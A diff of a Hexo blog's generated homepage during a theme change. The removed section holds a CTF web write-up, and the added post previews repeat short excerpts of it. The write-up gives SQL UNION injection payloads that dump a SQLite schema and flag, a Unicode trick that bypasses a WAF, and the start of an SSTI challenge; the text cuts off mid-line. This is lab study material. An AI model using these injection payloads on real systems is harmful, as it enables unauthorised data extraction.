@@ -1,810 +1,404 @@
+
+
+
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
-  
-  
-      
-<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
   
-  
-<link rel="stylesheet" href="/css/style.css">
 
-  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
-  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
-  
-    
-    
-  
-  
-      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  
-  <!-- 加载特效 -->
-    <script src="/js/pace.js"></script>
-    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
-  <script>
-      var yiliaConfig = {
-          rootUrl: '/',
-          fancybox: true,
-          animate: true,
-          isHome: true,
-          isPost: false,
-          isArchive: false,
-          isTag: false,
-          isCategory: false,
-          open_in_new: false
-      }
-  </script>
+<link rel="canonical" href="http://example.com/">
+
+
+
+  <title>Yume Shoka = Hexo</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
-<body>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
   <div id="container">
-    <div class="left-col">
-    <div class="overlay"></div>
-<div class="intrude-less">
-    <header id="header" class="inner">
-        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-        <a href="/" class="profilepic">
-            
-            <img lazy-src="img/head.jpg" class="js-avatar">
-            
-        </a>
-        <hgroup>
-          <h1 class="header-author"><a href="/"></a></h1>
-        </hgroup>
-        
-        
-            <form>
-                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
-            </form>
-            <div id="local-search-result"></div>
-        
-        
-            <script type="text/javascript">
-                (function() {
-                    'use strict';
-                    function getMatchData(keyword, data) {
-                        var matchData = [];
-                        for(var i =0;i<data.length;i++){
-                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
-                                matchData.push(data[i])
-                        }
-                        return matchData;
-                    }
-                    var $input = $('#local-search-input');
-                    var $resultContent = $('#local-search-result');
-                    $input.keyup(function(){
-                        $.ajax({
-                            url: '/search.json',
-                            dataType: "json",
-                            success: function( json ) {
-                                var str='<ul class=\"search-result-list\">';                
-                                var keyword = $input.val().trim().toLowerCase();
-                                $resultContent.innerHTML = "";
-                                if ($input.val().trim().length <= 0) {
-                                    $resultContent.empty();
-                                    $('#switch-area').show();
-                                    return;
-                                }
-                                var results = getMatchData(keyword, json);
-                                if(results.length === 0){
-                                    $resultContent.empty();
-                                    $('#switch-area').show();
-                                    return;
-                                } 
-                                for(var i =0; i<results.length; i++){
-                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
-                                }
-                                str += "</ul>";
-                                $resultContent.empty();
-                                $resultContent.append(str);
-                                $('#switch-area').hide();
-                            }
-                        });
-                    });
-                })();
-            </script>
-        
-        
-            <div id="switch-btn" class="switch-btn">
-                <div class="icon">
-                    <div class="icon-ctn">
-                        <div class="icon-wrap icon-house" data-idx="0">
-                            <div class="birdhouse"></div>
-                            <div class="birdhouse_holes"></div>
-                        </div>
-                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
-                            <div class="ribbon"></div>
-                        </div>
-                        
-                        <div class="icon-wrap icon-link hide" data-idx="2">
-                            <div class="loopback_l"></div>
-                            <div class="loopback_r"></div>
-                        </div>
-                        
-                        
-                        <div class="icon-wrap icon-me hide" data-idx="3">
-                            <div class="user"></div>
-                            <div class="shoulder"></div>
-                        </div>
-                        
-                    </div>
-                </div>
-                <div class="tips-box hide">
-                    <div class="tips-arrow"></div>
-                    <ul class="tips-inner">
-                        <li>菜单</li>
-                        <li>标签</li>
-                        
-                        <li>友情链接</li>
-                        
-                        
-                        <li>关于我</li>
-                        
-                    </ul>
-                </div>
-            </div>
-        
-        <div id="switch-area" class="switch-area">
-            <div class="switch-wrap">
-                <section class="switch-part switch-part1">
-                    <nav class="header-menu">
-                        <ul>
-                        
-                            <li><a  target="_blank" rel="noopener" href="http://bestwing.me">博客首页</a></li>
-                        
-                            <li><a  href="/archives">文章归档</a></li>
-                        
-                            <li><a  href="/CTFStudy">学习导航</a></li>
-                        
-                            <li><a  href="/PWNABLE">PWNABLE</a></li>
-                        
-                            <li><a  href="/resume">个人简历</a></li>
-                        
-                        </ul>
-                    </nav>
-                    <nav class="header-nav">
-                        <ul class="social">
-                            
-                                <a class="fl mail"  target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
-                            
-                                <a class="fl github"  target="_blank" href="https://github.com/WinMin" title="github">github</a>
-                            
-                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
-                            
-                                <a class="fl weibo"  target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
-                            
-                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
-                            
-                        </ul>
-                    </nav>
-                </section>
-                
-                <section class="switch-part switch-part2">
-                    <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/hello-world/" style="font-size: 10px;">hello world</a>
-                    </div>
-                </section>
-                
-                
-                <section class="switch-part switch-part3">
-                    <div id="js-friends">
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://ring3.xyz/">Yllen</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">K0sh1</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.ycjcl.cc/">信鑫</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://bystudent.com/">ByStundet表哥</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.jarviswang.me/">汪神_Jarvis</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://sh3ll.me/">Chu</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy">L3m0n</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://o0xmuhe.me/">muhe</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.nuptzj.cn/">_画船听雨</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.virzz.com/index.html">Virink</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.sqlsec.com/">国光</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.bodkin.ren/">老锥</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cizel.cn/">C1zel</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://1phan.cc">1phan</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.liuil.top/">liuil</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://burnegg.com/">burnegg</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://jwrsec.cn/">jwr-sec</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://sudalover.cn/">苏打</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://blog.binklac.com">VeroFess</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.bendawang.site/">bendawang</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://weeklyalgo.codes/">hook</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.flier.net.cn/">Flier&#39;blog</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.mutepig.club">mutepig</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://blog.iret.xyz/list.aspx">Silver</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://simp1e.leanote.com/">Simple</a>
-                    
-                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://processor.pub/">Processor</a>
-                    
-                    </div>
-                </section>
-                
-                
-                
-                <section class="switch-part switch-part4">
-                
-                    <div id="js-aboutme">一只淹死在二进制海洋里的二进制狗</div>
-                </section>
-                
-            </div>
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+            <a href="/" class="logo" rel="start"><p class="artboard">Yume Shoka</p>
+              <h1 itemprop="name headline" class="title">Hexo</h1>
+            </a>
+          
+          </div>
         </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipexe4oykj20zk0m87ji.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclh3brzpj20zk0m8ann.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicit4jrvuj20zk0m8785.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhfehz7j20zk0m8u0x.jpg"></li>
+        </ul>
+      </div>
     </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="index wrap">
+    <h2 class="divider">Post List</h2>
+    <div class="segments posts">
+        
+<article class="item">
+  <div class="cover">
+    <a href="/2023/08/28/Tenable%20CTF/" itemprop="url" title="Untitled"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1gicitzannuj20zk0m8b29.jpg"></a>
+  </div>
+  <div class="info">
+    
+<div class="meta">
+  <span class="item" title="Created: 2023-08-28 13:11:45">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <time itemprop="dateCreated datePublished" datetime="2023-08-28T13:11:45+08:00">2023-08-28</time>
+  </span>
 </div>
 
+    <h3><a href="/2023/08/28/Tenable%20CTF/" itemprop="url" title="Untitled">Untitled</a></h3>
+    <div class="excerpt">
+        123title: Tenable CTF WEBdate: 2023-08-25 00:49:55tags: CTF
+
+Tenable CTFwebCat Viewerthe others solution:
+1asdf&amp;quot; UNION SELECT NULL, NULL, id || &amp;quot; :::: &amp;quot; || name || &amp;quot; :::: &amp;quot; || flag, NULL FROM cats; --
+
+my solution:
+12345678Shelton&amp;quot; order by...
     </div>
-    <div class="mid-col">
-      <nav id="mobile-nav">
-      <div class="overlay">
-          <div class="slider-trigger"></div>
-          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me"></a></h1>
+    <a href="/2023/08/28/Tenable%20CTF/" itemprop="url" title="Untitled" class="btn">more...</a>
+  </div>
+</article>
+
+        
+<article class="item">
+  <div class="cover">
+    <a href="/2023/08/28/LITCTF%202023%20WEB/" itemprop="url" title="Untitled"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1gipewf5l51j20zk0m8b29.jpg"></a>
+  </div>
+  <div class="info">
+    
+<div class="meta">
+  <span class="item" title="Created: 2023-08-28 13:11:42">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <time itemprop="dateCreated datePublished" datetime="2023-08-28T13:11:42+08:00">2023-08-28</time>
+  </span>
+</div>
+
+    <h3><a href="/2023/08/28/LITCTF%202023%20WEB/" itemprop="url" title="Untitled">Untitled</a></h3>
+    <div class="excerpt">
+        123title: LITCTF 2023 WEBdate: 2023-08-28 00:49:55tags: CTF
+
+LITCTF 2023 WEBweb&amp;#x2F;My boss left1234567891011121314151617181920&amp;lt;?php// Check if the request is a POST requestif ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) &amp;#123; // Read and decode the...
+    </div>
+    <a href="/2023/08/28/LITCTF%202023%20WEB/" itemprop="url" title="Untitled" class="btn">more...</a>
+  </div>
+</article>
+
+        
+<article class="item">
+  <div class="cover">
+    <a href="/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" itemprop="url" title="Untitled"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1giclflwv2aj20zk0m84qp.jpg"></a>
+  </div>
+  <div class="info">
+    
+<div class="meta">
+  <span class="item" title="Created: 2023-08-28 13:11:37">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <time itemprop="dateCreated datePublished" datetime="2023-08-28T13:11:37+08:00">2023-08-28</time>
+  </span>
+</div>
+
+    <h3><a href="/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" itemprop="url" title="Untitled">Untitled</a></h3>
+    <div class="excerpt">
+        123title: DASCTF 2023 &amp;amp; 0X401七月暑期挑战赛-WEB Writeupdate: 2023-08-25 00:49:55tags: CTF
+
+DASCTF 2023 &amp;amp; 0X401七月暑期挑战赛-WEB...
+    </div>
+    <a href="/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" itemprop="url" title="Untitled" class="btn">more...</a>
+  </div>
+</article>
+
+        
+<article class="item">
+  <div class="cover">
+    <a href="/2023/08/25/hello-world/" itemprop="url" title="article"><img data-src="https://tva2.sinaimg.cn/mw690/6833939bly1giclfdu6exj20zk0m87hw.jpg"></a>
+  </div>
+  <div class="info">
+    
+<div class="meta">
+  <span class="item" title="Created: 2023-08-25 00:49:55">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <time itemprop="dateCreated datePublished" datetime="2023-08-25T00:49:55+08:00">2023-08-25</time>
+  </span>
+</div>
+
+    <h3><a href="/2023/08/25/hello-world/" itemprop="url" title="article">article</a></h3>
+    <div class="excerpt">
+        hello!Welcome to Harder’ Blog!
+    </div>
+    <a href="/2023/08/25/hello-world/" itemprop="url" title="article" class="btn">more...</a>
+  </div>
+</article>
+
+    </div>
+
+  </div>
+
+  
+
+
+
+        </div>
+        <div id="sidebar">
+          
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
       </div>
-    <div class="intrude-less">
-        <header id="header" class="inner">
-            <a href="/" class="profilepic">
-                
-                    <img lazy-src="/img/head.jpg" class="js-avatar">
-                
-            </a>
-            <hgroup>
-              <h1 class="header-author"><a href="/" title="Me"></a></h1>
-            </hgroup>
-            
-            <nav class="header-menu">
-                <ul>
-                
-                    <li><a target="_blank" rel="noopener" href="http://bestwing.me">博客首页</a></li>
-                
-                    <li><a href="/archives">文章归档</a></li>
-                
-                    <li><a href="/CTFStudy">学习导航</a></li>
-                
-                    <li><a href="/PWNABLE">PWNABLE</a></li>
-                
-                    <li><a href="/resume">个人简历</a></li>
-                
-                <div class="clearfix"></div>
-                </ul>
-            </nav>
-            <nav class="header-nav">
-                <div class="social">
-                    
-                        <a class="mail" target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=kvH99PT39-Dn_efS5PvivOPjvPH9-w" title="mail">mail</a>
-                    
-                        <a class="github" target="_blank" href="https://github.com/WinMin" title="github">github</a>
-                    
-                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/Swings" title="zhihu">zhihu</a>
-                    
-                        <a class="weibo" target="_blank" href="http://weibo.com/2672317963/profile?topnav=1&wvr=6&is_all=1" title="weibo">weibo</a>
-                    
-                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
-                    
-                </div>
-            </nav>
-        </header>                
+      <div class="related panel pjax" data-title="Related">
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="John Doe"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">John Doe</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">4</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">1</span>
+        <span class="name">tags</span>
+      </a>
     </div>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-Tenable CTF" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2023/08/28/Tenable%20CTF/" class="article-date">
-      <time datetime="2023-08-28T05:11:45.029Z" itemprop="datePublished">2023-08-28</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: Tenable CTF WEB</span><br><span class="line">date: 2023-08-25 00:49:55</span><br><span class="line">tags: CTF</span><br></pre></td></tr></table></figure>
 
-<h1 id="Tenable-CTF"><a href="#Tenable-CTF" class="headerlink" title="Tenable CTF"></a>Tenable CTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cat-Viewer"><a href="#Cat-Viewer" class="headerlink" title="Cat Viewer"></a>Cat Viewer</h3><p>the others solution:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asdf&quot; UNION SELECT NULL, NULL, id || &quot; :::: &quot; || name || &quot; :::: &quot; || flag, NULL FROM cats; --</span><br></pre></td></tr></table></figure>
-
-<p>my solution:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Shelton&quot; order by 4;</span><br><span class="line">Shelton&quot; union select 1,2,3,4;</span><br><span class="line">Shelton&quot; union select 1,2,sqlite_version(),4;</span><br><span class="line">Shelton&quot; union select 1,2,sql from sqlite_master,4;</span><br><span class="line">Shelton&quot; union select 1,2,(select sql from sqlite_master),4;</span><br><span class="line">Shelton&quot; union select 1,2,(select group_concat(sql) from sqlite_master),4;</span><br><span class="line">Shelton&quot; union select 1,2,(select group_concat(sql) from sqlite_master),4;</span><br><span class="line">Shelton&quot; union select 1,2,(select group_concat(flag) from cats),4;</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230811170204603.png" alt="image-20230811170204603"></p>
-<p>flag{a_sea_of_cats}</p>
-<h3 id="Bad-Waf-No-Donut"><a href="#Bad-Waf-No-Donut" class="headerlink" title="Bad Waf No Donut"></a>Bad Waf No Donut</h3><p>首先打开Explore查看</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Explore<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;content&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">function</span> <span class="title function_">isAdmin</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">let</span> cookie = <span class="built_in">decodeURIComponent</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">let</span> cookie_values = cookie.<span class="title function_">split</span>(<span class="string">&#x27;;&#x27;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt;cookie_values.<span class="property">length</span>; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">let</span> c = cookie_values[i];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">while</span> (c.<span class="title function_">charAt</span>(<span class="number">0</span>) == <span class="string">&#x27; &#x27;</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      c = c.<span class="title function_">substring</span>(<span class="number">1</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="keyword">if</span> (c.<span class="title function_">indexOf</span>(<span class="string">&quot;admin&quot;</span>) == <span class="number">0</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="keyword">if</span> (c.<span class="title function_">substring</span>(name.<span class="property">length</span>, c.<span class="property">length</span>).<span class="title function_">indexOf</span>(<span class="string">&quot;true&quot;</span>)) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="keyword">return</span> <span class="literal">false</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">if</span> (<span class="title function_">isAdmin</span>())&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;a href=&quot;/secrets&quot;&gt;secrets&lt;/a&gt;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">else</span> &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/books&quot;&gt;books&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/cats&quot;&gt;cats&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/shopping_list&quot;&gt;shopping list&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&#x27;</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">&#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>我们没有admin的cookie，故我们直接访问 &#x2F;secrets 路径，直接查看源码</p>
-<p><img src="C:\Users\Harder\AppData\Roaming\Typora\typora-user-images\image-20230811173447237.png" alt="image-20230811173447237"></p>
-<p>首先传入flag发现可能是对的，然后看源码里面的secret猜测可能是同一种编码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secret_name=flag   </span><br><span class="line">secret_name=ⓕⓛⓐⓖ</span><br></pre></td></tr></table></figure>
-
-<p>flag{h0w_d0es_this_even_w0rk}</p>
-<h3 id="Rose"><a href="#Rose" class="headerlink" title="Rose"></a>Rose</h3><p>这题一上来就看见可以进行ssti模板注入，然后想办法控制session[‘name’]的值</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@main.route(<span class="params"><span class="string">&#x27;/dashboard&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;% extends &quot;base.html&quot; %&#125; &#123;% block content %&#125;</span></span><br><span class="line"><span class="string">&lt;h1 class=&quot;title&quot;&gt;</span></span><br><span class="line"><span class="string">    Welcome, &#x27;&#x27;&#x27;</span>+ session[<span class="string">&quot;name&quot;</span>] +<span 